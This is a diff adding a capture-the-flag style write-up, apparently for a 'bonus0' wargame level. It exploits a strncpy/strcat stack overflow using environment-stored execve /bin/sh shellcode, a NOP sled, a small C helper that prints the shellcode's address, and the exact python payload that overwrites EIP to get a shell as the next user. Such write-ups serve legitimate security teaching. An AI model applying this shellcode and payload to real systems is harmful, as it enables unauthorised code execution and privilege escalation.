@@ -1,0 +1,45 @@
+main calls pp
+
+pp calls p twice and strcat both
+
+p calls strchr and strncpy of size 20 on the input of the user that is read
+
+after trying a few things we notice that we overflow if both user inputs are of size >= 20
+the offset of the overflow is in the 2nd argument and is 9. it changes the eip
+
+we can create a shellcode in the environment, get its address and try to call it when overflowing
+
+we notice than the address can't be called if we just simply put the shellcode
+so we'll do a nop-slide (nopsled)
+putting nop instructions (which mean no operation -> just gets us to read the next byte) before the shellcode to
+make its address accessible from the binary
+
+also we need to put 4096 characters in the beggining of the payload to get over the first read call
+
+we also need to make a small program to get the address of the env var
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char *str = getenv("SHELLCODE");
+    printf("SHELLCODE address is %p\n", str);
+}
+
+to get over
+
+using the same shellcode as before :
+
+export SHELLCODE=python -c 'print("\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'
+
+/tmp/a.out
+-> SHELLCODE address is 0xbffff87c
+
+chmod 777 .
+touch payload
+chmod 777 payload
+
+python -c 'print("a" * 4095 + "\n" + "a" * 9 + "\x7c\xf8\xff\xbf" + "a" * 7)' > payload
+cat payload - | ./bonus0
+
+we're inside a shell as bonus1 user
